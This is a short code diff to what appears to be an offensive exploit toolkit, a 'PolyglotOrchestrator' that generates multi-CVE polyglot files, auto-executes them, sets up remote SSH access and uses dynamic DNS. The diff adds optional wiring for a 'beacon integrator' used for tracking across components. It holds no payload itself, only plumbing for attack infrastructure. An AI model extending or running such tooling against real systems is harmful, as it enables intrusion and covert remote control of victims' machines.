@@ -46,6 +46,14 @@ from multi_cve_polyglot import MultiCVEPolyglot
 from exploit_header_generator import ExploitHeaderGenerator
 from duckdns_integration import DuckDNSIntegration
 
+# Try to import beacon integration
+try:
+    from guarantee_beacon_integrator import BeaconIntegrator
+    BEACON_AVAILABLE = True
+except ImportError:
+    BEACON_AVAILABLE = False
+    BeaconIntegrator = None
+
 
 class PolyglotOrchestrator:
     """Main orchestrator for polyglot generation and auto-execution"""
@@ -73,6 +81,15 @@ class PolyglotOrchestrator:
         self.remote_access_enabled = False
         self.ssh_port = None
         self.ssh_script_content = None
+
+        # Initialize beacon integrator if available
+        self.beacon_integrator = None
+        if BEACON_AVAILABLE and BeaconIntegrator:
+            try:
+                self.beacon_integrator = BeaconIntegrator(tui=self.tui)
+                self.tui.success("Beacon integrator initialized for cross-component tracking")
+            except Exception as e:
+                self.tui.warning(f"Could not initialize beacon integrator: {e}")
 
     def _init_campaign_directory(self) -> str:
         """
